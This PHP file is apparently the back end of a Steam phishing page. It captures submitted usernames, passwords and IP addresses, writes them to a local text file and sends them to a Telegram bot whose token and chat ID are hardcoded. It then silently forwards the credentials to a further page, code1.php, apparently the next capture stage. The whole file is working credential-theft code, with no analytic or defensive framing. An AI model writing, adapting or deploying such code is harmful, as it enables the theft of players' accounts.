<?php
$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];

// 1. Сохраняем локально
file_put_contents("usernames.txt", "Steam Username: $username | Pass: $password | IP: $ip\n", FILE_APPEND);

// 2. Отправляем в Telegram
$botToken = "8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4";
$chatId = "7455610355";
$message = "🔥 STEP 1 - LOGIN DATA\n👤: $username\n🔑: $password\n🌐 IP: $ip";

$telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $message
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramUrl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// 3. ПЕРЕХОДИМ НА CODE1.PHP ВМЕСТО РЕДИРЕКТА НА ОСНОВНОЙ САЙТ
?>
<form id="redirectForm" action="code1.php" method="post">
    <input type="hidden" name="username" value="<?= htmlspecialchars($username) ?>">
    <input type="hidden" name="password" value="<?= htmlspecialchars($password) ?>">
</form>
<script>
    document.getElementById('redirectForm').submit();
</script>